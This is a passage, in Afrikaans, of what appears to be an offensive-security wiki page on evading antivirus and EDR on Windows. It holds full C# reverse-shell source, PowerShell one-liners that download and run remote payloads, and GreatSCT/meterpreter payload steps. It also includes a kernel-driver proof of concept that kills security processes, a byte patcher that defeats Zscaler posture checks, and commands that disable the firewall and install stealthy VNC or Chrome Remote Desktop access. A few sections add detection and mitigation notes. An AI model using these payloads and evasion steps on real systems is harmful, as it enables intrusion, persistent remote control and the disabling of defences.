- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om, tydens kompilering, geobfuskeerde code te genereer sonder om enige eksterne tool te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word, wat die lewe van die persoon wat die toepassing wil crack, ’n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64 binary-obfuscator wat verskeie verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese code-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code-obfuscation-raamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op assembly-codevlak deur gewone instruksies in ROP-kettings te transformeer, wat ons natuurlike opvatting van normale control flow verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai.

## SmartScreen & MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sommige uitvoerbare lêers vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met ’n reputasiegebaseerde benadering. Dit beteken dat toepassings wat ongewoon afgelaai word, SmartScreen sal aktiveer en die eindgebruiker sodoende waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **trusted** signing certificate onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie effektiewe manier om te voorkom dat jou payloads die Mark of The Web kry, is om hulle binne ’n soort container, soos ’n ISO, te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS** volumes toegepas **kan** word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n tool wat payloads in output-containers verpak om Mark-of-the-Web te omseil.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is ’n demo vir die omseiling van SmartScreen deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logging-meganisme in Windows wat toepassings en stelselkomponente toelaat om **events te log**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soortgelyk aan hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-proses onmiddellik te laat terugkeer sonder om enige events te log. Dit word gedoen deur die funksie in die geheue te patch om onmiddellik terug te keer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Die laai van C#-binaries in die geheue is al ’n geruime tyd bekend en dit is steeds ’n baie goeie manier om jou post-exploitation tools uit te voer sonder om deur AV opgespoor te word.

Aangesien die payload direk in die geheue gelaai sal word sonder om aan die skyf te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels dat ’n **nuwe sacrificial process** geskep word, jou post-exploitation-kwaadwillige kode in daardie nuwe proses geïnject word, jou kwaadwillige kode uitgevoer word en die nuwe proses beëindig word wanneer dit klaar is. Dit het voordele sowel as nadele. Die voordeel van die fork and run-metode is dat execution **buite** ons Beacon-implant-proses plaasvind. Dit beteken dat indien iets in ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **baie groter kans** is dat ons **implant sal oorleef.** Die nadeel is dat jy ’n **groter kans** het om deur **Behavioural Detections** opgespoor te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die post-exploitation-kwaadwillige kode **in sy eie proses** geïnject word. Op hierdie manier kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat indien iets tydens die execution van jou payload verkeerd loop, daar ’n **baie groter kans** is dat jy jou **beacon sal verloor**, aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor C# Assembly loading wil lees, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell af** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die compromised machine toegang te gee **tot die interpreter environment wat op die Attacker Controlled SMB share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die environment op die SMB share toe te laat, kan jy **arbitrary code in hierdie tale binne die geheue** van die compromised machine uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om static signatures te omseil**. Toetsing met willekeurige, un-obfuscated reverse shell-scripts in hierdie tale was suksesvol.

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se privileges te verminder, kan die proses aanhou loop terwyl dit verhoed word om privileged inspection- of remediation-aksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhoed** om handles oor die tokens van sekuriteitsprosesse te verkry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**hierdie blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om die Chrome Remote Desktop eenvoudig op ’n slagoffer se PC te deploy en dit dan te gebruik om beheer daaroor oor te neem en persistence te handhaaf:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Run die installer stilweg op die slagoffer (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal jou dan vra om te authorize; klik op die Authorize-knoppie om voort te gaan.
4. Execute die verskafte command met die vereiste aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder die GUI te gebruik).


## Advanced Evasion

Evasion is ’n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetry in slegs een stelsel in ag neem, dus is dit feitlik onmoontlik om in volwasse environments heeltemal onopgespoor te bly.

Elke environment waarteen jy optree, sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) kyk om ’n beginpunt met meer Advanced Evasion-tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig identifiseer, en dit aan jou sal wys.\
Nog ’n tool wat **dieselfde ding doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop web-aanbieding van die diens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet server** ingesluit wat jy (as administrator) kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in by _VNC Password_
- Stel ’n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuutgeskepte** lêer _**UltraVNC.ini**_ binne die **victim**

#### **Reverse connection**

Die **attacker** moet die binary `vncviewer.exe -listen 5900` **binne** sy **host** uitvoer sodat dit **voorbereid** sal wees om ’n reverse **VNC connection** te ontvang. Begin dan binne die **victim** die winvnc daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te behou, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit veroorsaak dat [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin nou die **lister** met `msfconsole -r file.rc` en **execute** die **xml payload** met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# met behulp van compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik Python vir build injectors-voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanuit Kernel Space beëindig

Storm-2603 het ’n klein console utility genaamd **Antivirus Terminator** gebruik om endpoint-beskerming te deaktiveer voordat ransomware afgelaai is. Die tool bring sy **eie kwesbare maar *getekende* driver** en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Getekende driver**: Die lêer wat na die skyf gelewer word, is `ServiceMouse.sys`, maar die binary is die wettig getekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as ’n **kernel service** en die tweede een begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs wat deur die driver blootgestel word**
| IOCTL-kode | Vermoë                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (gebruik om Defender/EDR-dienste te beëindig) |
| `0x990000D0` | Verwyder ’n arbitrêre lêer op die skyf |
| `0x990001D0` | Unload die driver en verwyder die diens |

Minimale C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**:  BYOVD omseil user-mode-beskerming volledig; code wat in die kernel uitgevoer word, kan *protected* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardening-features.

Opsporing / Versagting
•  Aktiveer Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel*-dienste en genereer ’n waarskuwing wanneer ’n driver vanaf ’n world-writable-gids gelaai word of nie op die allow-list voorkom nie.
•  Hou user-mode-handles na custom device objects dop, gevolg deur verdagte `DeviceIoControl`-calls.

### Omseiling van Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture-reëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige bypass moontlik:

1. Posture-evaluering gebeur **geheel en al aan die client-kant** (’n boolean word na die server gestuur).
2. Interne RPC-endpoints valideer slegs dat die executable **deur Zscaler geteken** is (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier getekende binaries op die skyf te patch**, kan albei meganismes geneutraliseer word:

| Binary | Oorspronklike logika wat gepatch is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke check compliant is |
| `ZSAService.exe` | Indirekte call na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks op die tunnel | Kortgesluit |

Minimale patcher-uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang en die diensstapel herbegin is:

* **Alle** posture checks vertoon **groen/voldoenend**.
* Ongtekende of gewysigde binaries kan die benoemde-pyp-RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie demonstreer hoe suiwer client-side trust-besluite en eenvoudige signature checks met ’n paar byte patches omseil kan word.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) dwing ’n signer/level-hiërargie af sodat slegs protected processes met dieselfde of ’n hoër vlak met mekaar kan peuter. Vanuit ’n offensiewe perspektief: as jy ’n PPL-enabled binary legitiem kan launch en die arguments daarvan kan beheer, kan jy benign functionality (bv. logging) omskep in ’n beperkte, PPL-backed write primitive teen protected directories wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n process as PPL laat loop
- Die teiken-EXE (en enige loaded DLLs) moet met ’n PPL-capable EKU gesign wees.
- Die process moet met CreateProcess geskep word deur die flags te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare protection level moet versoek word wat met die signer van die binary ooreenstem (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal tydens creation misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS protection:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies die protection level en stuur arguments aan die teiken-EXE deur):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signed system binary `C:\Windows\System32\ClipUp.exe` spawn homself en aanvaar ’n parameter om ’n log file na ’n pad wat deur die caller gespesifiseer is, te skryf.
- Wanneer dit as ’n PPL-process geloods word, vind die file write met PPL-ondersteuning plaas.
- ClipUp kan nie paths met spasies parse nie; gebruik 8.3 short paths om na normaalweg protected locations te wys.

8.3 short path helpers
- Lys short names: `dir /x` in elke parent directory.
- Lei ’n short path in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstrak)
1) Launch die PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n launcher te gebruik (byvoorbeeld CreateProcessAsPPL).
2) Gee die ClipUp log-path argument deur om file creation in ’n protected AV-directory af te dwing (byvoorbeeld Defender Platform). Gebruik 8.3 short names indien nodig.
3) As die target binary normaalweg deur die AV oopgemaak/gelock word terwyl dit loop (byvoorbeeld MsMpEng.exe), schedule die write tydens boot voordat die AV start deur ’n auto-start service te installeer wat betroubaar vroeër loop. Valideer boot ordering met Process Monitor (boot logging).
4) Met reboot vind die PPL-backed write plaas voordat die AV sy binaries lock, wat die target file corrupt en startup voorkom.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie; die primitive is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaaivenster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; uitvoering tydens boot vermy lêerslotte.

Opsporing
- Prosesskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers as ouerproses begin word, rondom boot.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek diensskepping/-wysiging voor Defender-opstartfoute.
- File integrity monitoring op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep word en abnormale PPL-vlakgebruik deur nie-AV-binaries.

Versagtings
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroeping buite legitieme kontekste.
- Dienshigiëne: beperk skepping/wysiging van outomatiese-opstartdienste en monitor manipulasie van die opstartvolgorde.
- Maak seker Defender tamper protection en early-launch-beskermings is geaktiveer; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3 short-name generation te deaktiveer op volumes wat security tooling huisves indien dit met jou omgewing versoenbaar is (toets deeglik).

## Sabotering van Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende te enumeriseer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe-string (byvoorbeeld `4.18.25070.5-0`) en begin dan die Defender-diensprosesse daarvandaan (met die opdatering van diens-/registerpaaie dienooreenkomstig). Hierdie keuse vertrou directory entries, insluitend directory reparse points (symlinks). 'n Administrateur kan dit benut om Defender na 'n pad wat deur 'n aanvaller geskryf kan word, te herlei en DLL sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Local Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te reboot of Defender-platformherseleksie te aktiveer (diensherbegin tydens boot)
- Slegs ingeboude tools word benodig (mklink)

Waarom dit werk
- Defender blokkeer writes in sy eie gidse, maar sy platformseleksie vertrou directory entries en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/vertroude pad resolve.

Stap vir stap (voorbeeld)
1) Berei 'n writable clone van die huidige platformgids voor, byvoorbeeld `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
